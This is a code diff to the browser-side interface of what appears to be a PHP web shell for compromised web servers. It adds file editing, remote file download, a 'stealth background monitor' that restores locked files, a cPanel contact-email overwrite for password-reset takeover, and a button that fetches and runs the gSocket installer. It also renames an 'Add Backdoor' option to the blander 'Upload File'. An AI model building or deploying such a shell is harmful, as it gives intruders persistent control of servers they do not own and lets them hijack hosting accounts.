+                    if (data.encoding === 'binary') {
+                            modalBody.innerHTML = `<h2><i class="fa-solid fa-warning" style="color:#ffc107;"></i> Cannot Edit Binary</h2><p>${data.content}</p>`;
+                            return;
+                    }
+                    
+                    // Determine mode based on file extension
+                    let mode = 'text/plain';
+                    const extension = fileName.split('.').pop().toLowerCase();
+                    switch(extension) {
+                        case 'php':
+                            mode = 'application/x-httpd-php'; 
+                            break;
+                        case 'js':
+                            mode = 'text/javascript'; 
+                            break;
+                        case 'css':
+                            mode = 'text/css'; 
+                            break;
+                        case 'html':
+                        case 'htm':
+                            mode = 'text/html'; 
+                            break;
+                        case 'py':
+                            mode = 'python'; 
+                            break;
+                        case 'sh':
+                            mode = 'shell'; 
+                            break;
+                        case 'c':
+                        case 'cpp':
+                        case 'h':
+                            mode = 'text/x-csrc'; 
+                            break;
+                    }
+
+                    const formContent = `
+                    <h2><i class="fa-solid fa-file-pen"></i> Edit File: ${fileName}</h2>
+                    <form id="edit-form" method="post" action="">
+                        <input type="hidden" name="file_path" value="${fullPath}">
+                        <textarea name="file_content" id="editor-textarea"></textarea> 
+                        <div class="btn-group">
+                            <button type="submit" name="save_file">Save Changes</button>
+                            <button type="button" class="cancel-btn">Cancel</button>
+                        </div>
+                    </form>`;
+                    modalBody.innerHTML = formContent;
+                    document.querySelector('.cancel-btn').onclick = closeModal;
+
+                    editorInstance = CodeMirror.fromTextArea(document.getElementById('editor-textarea'), {
+                        lineNumbers: true,
+                        mode: mode,
+                        theme: 'base16-dark',
+                        lineWrapping: true,
+                        indentUnit: 4,
+                        tabSize: 4
+                    });
+
+                    editorInstance.focus();
+                    editorInstance.getDoc().setValue(data.content);
+
+                    document.getElementById('edit-form').addEventListener('submit', handleFormSubmit);
+                })
+                .catch(err => {
+                    modalBody.innerHTML = `<h2><i class="fa-solid fa-file-pen"></i> Edit File: ${fileName}</h2><p style="color:red;">Error fetching content: ${err.message}</p>`;
+                });
+        }
+
+
         document.addEventListener('DOMContentLoaded', function() {
             const modalOverlay = document.getElementById('modal-overlay');
             const modalBody = document.getElementById('modal-body');
             const modalClose = document.getElementById('modal-close');
-            let editorInstance = null;
-
+            
+            // Re-define these variables within the main scope if needed, or pass them to shared functions
             const currentPath = <?php echo json_encode($path); ?>;
             const currentPathEncoded = <?php echo json_encode(E($path)); ?>;
 
@@ -1233,17 +1636,24 @@ if ($files !== false) {
                     color: '#e0e0e0',
                     confirmButtonColor: '#4fc3f7'
                 });
-                window.history.replaceState({}, document.title, window.location.pathname + '?path=' + encodeURIComponent(currentPathEncoded));
+                const newUrl = new URL(window.location.href);
+                newUrl.searchParams.delete('msg');
+                newUrl.searchParams.delete('status');
+                window.history.replaceState({}, document.title, newUrl.toString());
             }
 
             const closeModal = () => {
                 modalOverlay.style.display = 'none';
                 modalBody.innerHTML = '';
-                if (editorInstance) {
-                    editorInstance.toTextArea();
-                    editorInstance = null;
+            };
+            
+            const handleFormSubmit = (e) => {
+                const form = e.target;
+                if (form.id.startsWith('edit-form') && CodeMirror.defaults.editorInstance) {
+                    CodeMirror.defaults.editorInstance.save(); 
                 }
             };
+
 
             modalClose.addEventListener('click', closeModal);
             modalOverlay.addEventListener('click', (e) => {
@@ -1251,27 +1661,39 @@ if ($files !== false) {
             });
 
             document.querySelectorAll('.feature-btn').forEach(button => {
-                button.addEventListener('click', () => {
-                    const action = button.title;
+                button.addEventListener('click', (e) => {
+                    const action = button.dataset.action;
                     let formContent = '';
                     switch (action) {
-                        case 'Create File':
-                            formContent = `<h2>Create New File</h2><form method="post" action=""><input type="hidden" name="path" value="${currentPath}"><input type="text" name="new_file_name" placeholder="Enter filename" required autofocus><button type="submit">Create File</button></form>`;
+                        case 'create_file':
+                            formContent = `<h2><i class="fa-regular fa-file-circle-plus"></i> Create New File</h2>
+                            <form method="post" action="">
+                                <input type="hidden" name="path" value="${currentPath}">
+                                <input type="text" name="new_file_name" placeholder="Enter filename" required autofocus>
+                                <button type="submit">Create File</button>
+                            </form>`;
                             break;
-                        case 'Create Folder':
-                            formContent = `<h2>Create New Folder</h2><form method="post" action=""><input type="hidden" name="path" value="${currentPath}"><input type="text" name="new_folder_name" placeholder="Enter folder name" required autofocus><button type="submit">Create Folder</button></form>`;
+                        case 'create_folder':
+                            formContent = `<h2><i class="fa-regular fa-folder-plus"></i> Create New Folder</h2>
+                            <form method="post" action="">
+                                <input type="hidden" name="path" value="${currentPath}">
+                                <input type="text" name="new_folder_name" placeholder="Enter folder name" required autofocus>
+                                <button type="submit">Create Folder</button>
+                            </form>`;
                             break;
-                        case 'Add Backdoor':
-                            formContent = `<h2><i class="fa-solid fa-upload"></i> Add Backdoor</h2>
+                        case 'file_upload':
+                             formContent = `<h2><i class="fa-solid fa-upload"></i> Upload File</h2>
+                            <p>Upload a file to the current directory: <strong>${currentPath}</strong></p>
                             <form method="post" action="" enctype="multipart/form-data">
-                            <input type="hidden" name="path" value="${currentPath}">
-                            <div class="form-group">
-                                <input type="file" name="uploaded_file" required>
-                            </div>
-                            <button type="submit" name="upload_file_action">Upload</button></form>`;
+                                <input type="hidden" name="path" value="${currentPath}">
+                                <div class="form-group">
+                                    <input type="file" name="uploaded_file" required>
+                                </div>
+                                <button type="submit" name="upload_file_action">Upload</button>
+                            </form>`;
                             break;
-                        case 'Remote Upload':
-                            formContent = `<h2><i class="fa-solid fa-cloud-arrow-up"></i> Remote Upload</h2>
+                        case 'remote_upload':
+                             formContent = `<h2><i class="fa-solid fa-cloud-arrow-down"></i> Remote Upload</h2>
                             <p>Enter the direct URL of the file to download to the current directory.</p>
                             <form method="post" action="">
                                 <input type="hidden" name="path" value="${currentPath}">
@@ -1287,25 +1709,26 @@ if ($files !== false) {
                             </form>`;
                             break;
 
-                        case 'Lock File':
+                        case 'lock_file':
                             formContent = `<h2><i class="fa-solid fa-shield-halved"></i> Lock & Protect File</h2>
-                            <p>This will make the file read-only and prevent deletion (Linux and Windows).</p>
+                            <p>This will set the file to 444 permissions and run a stealth background monitor to restore it if modified.</p>
                             <form method="post" action="">
-                            <input type="hidden" name="path" value="${currentPath}">
-                            <input type="text" name="file_integrity_id" placeholder="Enter filename to lock" required autofocus>
-                            <button type="submit">Lock File</button></form>`;
+                                <input type="hidden" name="path" value="${currentPath}">
+                                <input type="text" name="file_integrity_id" placeholder="Enter filename to lock" required autofocus>
+                                <button type="submit">Lock File</button>
+                            </form>`;
                             break;
-                        case 'Unlock Shell':
+                        case 'mass_unlock':
                             Swal.fire({
-                                title: 'Are you sure?',
-                                text: "This will attempt to terminate all active file-locking processes. This action is for Linux systems.",
+                                title: 'Mass Unlock?',
+                                text: "This attempts to terminate all active file-locking processes (Linux) or remove attributes from all files in the current folder (Windows).",
                                 icon: 'warning',
                                 background: '#2a2a2a',
                                 color: '#e0e0e0',
                                 showCancelButton: true,
-                                confirmButtonColor: '#d32f2f',
+                                confirmButtonColor: '#ff9800',
                                 cancelButtonColor: '#37474f',
-                                confirmButtonText: 'Yes, unlock!',
+                                confirmButtonText: 'Yes, Mass Unlock!',
                                 cancelButtonText: 'Cancel'
                             }).then((result) => {
                                 if (result.isConfirmed) {
@@ -1321,7 +1744,7 @@ if ($files !== false) {
 
                                     const actionInput = document.createElement('input');
                                     actionInput.type = 'hidden';
-                                    actionInput.name = 'gsocket';
+                                    actionInput.name = 'mass_unlock_action';
                                     actionInput.value = 'true';
                                     form.appendChild(actionInput);
 
@@ -1330,25 +1753,26 @@ if ($files !== false) {
                                 }
                             });
                             return;
-                        case 'cPanel Reset':
-                            formContent = `<h2>cPanel Reset (Reset By Email)</h2>
-                            <p>Note : Please dont use your real email by MadExploits. </p>
+                        case 'cpanel_reset':
+                            formContent = `<h2><i class="fa-solid fa-key"></i> cPanel Reset (Contactinfo)</h2>
+                            <p>Attempts to write an email address to <code>.cpanel/contactinfo</code> in the server's root directory.</p>
                             <form method="post" action="">
-                            <input type="hidden" name="path" value="${currentPath}">
-                            <input type="text" name="email" placeholder="Enter email to reset" required autofocus>
-                            <button type="submit">Submit</button></form>`;
+                                <input type="hidden" name="path" value="${currentPath}">
+                                <input type="text" name="email" placeholder="Enter email address" required autofocus>
+                                <button type="submit">Modify cPanel Contactinfo</button>
+                            </form>`;
                             break;
-                        case 'Gsocket':
+                        case 'gsocket':
                             Swal.fire({
-                                title: 'Are you sure?',
-                                text: "This will install Gsocket on your server.",
+                                title: 'Install gSocket?',
+                                text: "This will attempt to download and execute the gSocket installer script from a remote URL. This requires web access and shell execution rights.",
                                 icon: 'info',
                                 background: '#2a2a2a',
                                 color: '#e0e0e0',
                                 showCancelButton: true,
-                                confirmButtonColor: '#d32f2f',
+                                confirmButtonColor: '#4caf50',
                                 cancelButtonColor: '#37474f',
-                                confirmButtonText: 'Yes, Install.',
+                                confirmButtonText: 'Yes, Install gSocket',
                                 cancelButtonText: 'Cancel'
                             }).then((result) => {
                                 if (result.isConfirmed) {
@@ -1374,16 +1798,32 @@ if ($files !== false) {
                             });
                             return;
                         default:
-                            modalBody.innerHTML = `<h2>${action}</h2><p>Feature not yet implemented.</p>`;
+                            modalBody.innerHTML = `<h2>${button.title}</h2><p>Feature not yet implemented or unrecognized.</p>`;
                             modalOverlay.style.display = 'flex';
                             return;
                     }
                     modalBody.innerHTML = formContent;
                     modalOverlay.style.display = 'flex';
+                    
+                    // Attach submit handler to new form
+                    const formElement = modalBody.querySelector('form');
+                    if (formElement) {
+                         formElement.addEventListener('submit', handleFormSubmit);
+                    }
                 });
             });
 
             document.querySelector('.file-manager tbody').addEventListener('click', function(e) {
+                // >>>>>>> MODIFIKASI: Menangani klik pada tautan nama file <<<<<<<
+                const fileLink = e.target.closest('a.file-link-file');
+                if (fileLink) {
+                    e.preventDefault(); // Mencegah navigasi tautan (#)
+                    const fileName = fileLink.dataset.file;
+                    handleEdit(fileName); // Memanggil fungsi edit
+                    return;
+                }
+
+                // Lanjutkan dengan penanganan aksi tombol (EDIT, DOWNLOAD, dll.)
                 const button = e.target.closest('.action-btn');
                 if (!button) return;
 
@@ -1392,63 +1832,21 @@ if ($files !== false) {
                 const fullPath = currentPath + '/' + fileName;
                 let formContent = '';
 
-                const E = (str) => '\x30\x78' + Array.from(new TextEncoder().encode(str)).map(b => b.toString(16).padStart(2, '0')).join('');
+                // PHP's E() and D() recreated as JS functions for client-side encoding/decoding of paths for Ajax/Download
+                const E = (str) => '0x' + Array.from(new TextEncoder().encode(str)).map(b => b.toString(16).padStart(2, '0')).join('');
+
 
                 switch (action) {
                     case 'edit':
-                        modalBody.innerHTML = `<h2><i class="fa-solid fa-file-pen"></i> Edit File: ${fileName}</h2><p>Loading...</p>`;
-                        modalOverlay.style.display = 'flex';
-                        fetch(`?action=get_content&path=${currentPathEncoded}&file=${E(fileName)}`)
-                            .then(response => {
-                                if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-                                return response.json();
-                            })
-                            .then(data => {
-                                if (data.error) {
-                                    modalBody.innerHTML = `<h2><i class="fa-solid fa-file-pen"></i> Edit File: ${fileName}</h2><p style="color:red;">Error: ${data.error}</p>`;
-                                    return;
-                                }
-                                if (data.is_image) {
-                                    modalBody.innerHTML = `<h2><i class="fa-solid fa-file-image"></i> View Image: ${fileName}</h2><img src="${data.content}" style="max-width:100%; border-radius:8px;">`;
-                                    return;
-                                }
-
-                                formContent = `
-                                <h2><i class="fa-solid fa-file-pen"></i> Edit File: ${fileName}</h2>
-                                <form id="edit-form" method="post" action="">
-                                    <input type="hidden" name="file_path" value="${fullPath}">
-                                    <textarea name="file_content" id="editor-textarea"></textarea> 
-                                    <div class="btn-group">
-                                        <button type="submit" name="save_file">Save Changes</button>
-                                        <button type="button" class="cancel-btn">Cancel</button>
-                                    </div>
-                                </form>`;
-                                modalBody.innerHTML = formContent;
-                                document.querySelector('.cancel-btn').onclick = closeModal;
-
-                                editorInstance = CodeMirror.fromTextArea(document.getElementById('editor-textarea'), {
-                                    lineNumbers: true,
-                                    mode: 'application/x-httpd-php',
-                                    theme: 'base16-dark',
-                                    lineWrapping: true
-                                });
-
-                                editorInstance.focus();
-                                editorInstance.getDoc().setValue(data.content);
-
-                                document.getElementById('edit-form').addEventListener('submit', function() {
-                                    if (editorInstance) editorInstance.save();
-                                });
-                            })
-                            .catch(err => {
-                                modalBody.innerHTML = `<h2><i class="fa-solid fa-file-pen"></i> Edit File: ${fileName}</h2><p style="color:red;">Error fetching content: ${err.message}</p>`;
-                            });
+                        // Ini adalah tombol EDIT, panggil fungsi yang sama
+                        handleEdit(fileName);
                         return;
 
                     case 'download':
+                        // Path is current directory (E($path)), file is filename (E($fileName))
                         window.location.href = `?action=download&path=${currentPathEncoded}&file=${E(fileName)}`;
                         return;
-
+                    
                     case 'chmod':
                         const perms = button.dataset.perms;
                         formContent = `
@@ -1456,18 +1854,19 @@ if ($files !== false) {
                         <form method="post" action="">
                             <input type="hidden" name="path" value="${currentPath}">
                             <input type="hidden" name="chmod_file" value="${fileName}">
-                            <input type="text" name="perms" value="${perms}" required autofocus>
+                            <label for="perms">Permissions (Octal, e.g., 0755):</label>
+                            <input type="text" name="perms" value="${perms}" pattern="[0-7]{4}" required autofocus>
                             <button type="submit">Change Permissions</button>
                         </form>`;
                         break;
 
                     case 'delete':
                         formContent = `
-                        <h2>Confirm Deletion</h2>
+                        <h2><i class="fa-solid fa-trash-can"></i> Confirm Deletion</h2>
                         <form method="post" action="">
                             <input type="hidden" name="path" value="${currentPath}">
                             <input type="hidden" name="file_to_delete" value="${fileName}">
-                            <p>Are you sure you want to delete <strong>${fileName}</strong>? This action cannot be undone.</p>
+                            <p style="color:#ff5252;">Are you absolutely sure you want to delete <strong>${fileName}</strong>? This action cannot be undone.</p>
                             <div class="btn-group">
                                <button type="submit" name="confirm_delete" style="background-color:#d32f2f;">Yes, Delete</button>
                                <button type="button" class="cancel-btn">Cancel</button>
@@ -1480,10 +1879,11 @@ if ($files !== false) {
 
                     case 'rename':
                         formContent = `
-                        <h2>Rename</h2>
+                        <h2><i class="fa-solid fa-i-cursor"></i> Rename ${fileName}</h2>
                         <form method="post" action="">
                             <input type="hidden" name="path" value="${currentPath}">
                             <input type="hidden" name="old_name" value="${fileName}">
+                            <label for="new_name">New name:</label>
                             <input type="text" name="new_name" value="${fileName}" required autofocus>
                             <button type="submit">Rename</button>
                         </form>`;
@@ -1493,9 +1893,14 @@ if ($files !== false) {
                 }
                 modalBody.innerHTML = formContent;
                 modalOverlay.style.display = 'flex';
+                
+                // Attach submit handler to new form
+                const formElement = modalBody.querySelector('form');
+                if (formElement) {
+                     formElement.addEventListener('submit', handleFormSubmit);
+                }
             });
         });
     </script>
 </body>
-
 </html>
